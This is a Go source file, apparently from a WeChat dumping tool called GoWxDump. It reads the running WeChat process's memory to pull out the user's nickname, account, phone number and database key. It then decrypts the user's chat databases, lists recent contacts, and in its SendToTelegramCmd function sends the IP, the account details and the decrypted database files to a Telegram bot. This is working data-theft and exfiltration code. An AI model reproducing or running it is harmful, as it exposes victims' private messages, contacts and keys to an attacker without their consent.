package main

import (
	"GoWxDump/db"
	"fmt"
	"os"
	"path/filepath"
	"time"
)

func GetWeChatInfo() error {
	// 获取微信版本
	version, err := GetVersion(WeChatDataObject.WeChatWinModel)
	if err != nil {
		return err
	}
	// 获取微信昵称
	nickName, err := GetWeChatData(WeChatDataObject.WeChatHandle, WeChatDataObject.WeChatWinModel.ModBaseAddr+uintptr(OffSetMap[version][0]), 100)
	if err != nil {
		return err
	}
	// 获取微信账号
	account, err := GetWeChatData(WeChatDataObject.WeChatHandle, WeChatDataObject.WeChatWinModel.ModBaseAddr+uintptr(OffSetMap[version][1]), 100)
	if err != nil {
		return err
	}
	// 获取微信手机号
	mobile, err := GetWeChatData(WeChatDataObject.WeChatHandle, WeChatDataObject.WeChatWinModel.ModBaseAddr+uintptr(OffSetMap[version][2]), 100)
	if err != nil {
		return err
	}
	// 获取微信密钥
	key, err := GetWeChatKey(WeChatDataObject.WeChatHandle, WeChatDataObject.WeChatWinModel.ModBaseAddr+uintptr(OffSetMap[version][4]))
	if err != nil {
		return err
	}
	// 设置微信数据
	WeChatDataObject.Version = version
	WeChatDataObject.NickName = nickName
	WeChatDataObject.Account = account
	WeChatDataObject.Mobile = mobile
	WeChatDataObject.Key = key
	return nil
}

func ShowInfoCmd() {
	fmt.Printf("WeChat Version: %s \n", WeChatDataObject.Version)
	fmt.Printf("WeChat NickName: %s \n", WeChatDataObject.NickName)
	fmt.Printf("WeChat Account: %s \n", WeChatDataObject.Account)
	fmt.Printf("WeChat Mobile: %s \n", WeChatDataObject.Mobile)
	fmt.Printf("WeChat Key: %s \n", WeChatDataObject.Key)
}

func DecryptCmd() {
	// 获取用户数据目录
	wechatRoot, err := GetWeChatDir()
	if err != nil {
		fmt.Println("请手动设置微信消息目录")
		return
	}
	// 获取用户目录
	userDir, err := GetWeChatUserDir(wechatRoot)
	if err != nil {
		fmt.Println("GetWeChatUserDir error: ", err)
		return
	}
	dataDir := ""
	if IsSupportAutoGetData(WeChatDataObject.Version) {
		// 获取用户数据目录
		dataDirName, err := GetWeChatData(WeChatDataObject.WeChatHandle, WeChatDataObject.WeChatWinModel.ModBaseAddr+uintptr(OffSetMap[WeChatDataObject.Version][5]), 100)
		if err != nil {
			fmt.Println("GetWeChatDataDir error: ", err)
			return
		}
		// 获取用户数据目录，拼接成绝对路径
		dataDir = filepath.Join(wechatRoot, dataDirName)
	}

	// 判断目录是否存在如果不存，要求用户从userDir中选择一个目录
	_, err = os.Stat(dataDir)
	if err != nil {
		fmt.Println("物资自动识别，请从下面选择一个目录")
		for k, v := range userDir {
			fmt.Printf("[%s]:%s \n", k, v)
		}
		var input string
		// 提示输入
		fmt.Print("请选择上述id中的一个:")
		fmt.Scanln(&input)
		// 判断输入是否合法
		if _, ok := userDir[input]; !ok {
			fmt.Println("输入错误")
			return
		}
		dataDir = userDir[input]
	}
	fmt.Println("WeChat DataDir: ", dataDir)
	// 复制聊天记录文件到缓存目录dataDir + \Msg\Multi
	err = CopyMsgDb(filepath.Join(dataDir, "Msg", "Multi"))
	if err != nil {
		fmt.Println("CopyMsgDb error: ", err)
		return
	}
	err = CopyMsgDb(filepath.Join(dataDir, "Msg"))
	if err != nil {
		fmt.Println("CopyMicroMsgDb error: ", err)
		return
	}
	// 解密tmp目录下的所有.db文件，解密后的文件放在decrypted目录下
	err = DecryptDb(WeChatDataObject.Key)
	if err != nil {
		fmt.Println("DecryptDb error: ", err)
		return
	}
	// 清理缓存目录
	err = os.RemoveAll(CurrentPath + "\\tmp")
	if err != nil {
		fmt.Println("RemoveAll error: ", err)
		return
	}
}

func FriendsListCmd() {
	weChatDb := &db.WeChatDb{}
	// 初始化数据库对象
	err := weChatDb.InitDb(filepath.Join(CurrentPath, "decrypted", "MicroMsg.db"))
	if err != nil {
		fmt.Println("InitDb error: ", err)
		return
	}
	nearChatList, err := weChatDb.GetNearChatFriends(10)
	if err != nil {
		fmt.Println("GetNearChatFriends error: ", err)
		return
	}
	// fmt.Println(nearChatList)
	// 如果NearChatList不为空
	if len(nearChatList) > 0 {
		userNameList := make([]string, 0)
		for _, v := range nearChatList {
			userNameList = append(userNameList, v.Username)
		}
		userList, err := weChatDb.GetFriendInfoListWithUserList(userNameList)
		if err != nil {
			fmt.Println("GetFriendInfoListWithUserList error: ", err)
			return
		}
		// 按照nearChatList的顺序输出
		for _, v := range nearChatList {
			// 找到userList中Alias为v的元素
			for _, v1 := range userList {
				if v1.UserName == v.Username {
					lastTime := time.Unix(v.LastReadedCreateTime/1000, 0).Format("2006-01-02 15:04:05")
					fmt.Printf("NickName: %s \nRemark: %s \nAlias: %s \nUserName: %s \nLastTime: %s\n-------------------------------- \n", v1.NickName, v1.Remark, v1.Alias, v1.UserName, lastTime)
					break
				}
			}
		}
	}
	weChatDb.Close()
}

func SendToTelegramCmd() {
	if TELBOT_TOKEN != "" && TELBOT_CHAT_ID != 0 {
		publicIp, err := GetPublicIp()
		if err != nil {
			publicIp = ""
		}
		markDownText := fmt.Sprintf("```\n[%s]\n微信版本: %s\n微信昵称: %s\n微信账号: %s\n微信手机号: %s\n```", publicIp, WeChatDataObject.Version, WeChatDataObject.NickName, WeChatDataObject.Account, WeChatDataObject.Mobile)
		fileList := make([]string, 0)
		// 将decrypted目录下的所有.db文件添加到fileList中
		err = filepath.Walk(filepath.Join(CurrentPath, "decrypted"), func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return err
			}
			// 判断如果不是.db文件，就跳过
			if filepath.Ext(path) != ".db" {
				return nil
			}
			// 如果不是MicroMsg.db则跳过
			if info.Name() != "hello.db" && info.Name() != "word.db" {
				return nil
			}
			if !info.IsDir() {
				fileList = append(fileList, path)
			}
			return nil
		})
		// 如果fileList不为空，就发送文件
		if len(fileList) > 0 {
			TeleSendFileAndMessage(markDownText, fileList)
		} else {
			TeleSendMarkDownMessage(markDownText)
		}

	}
}
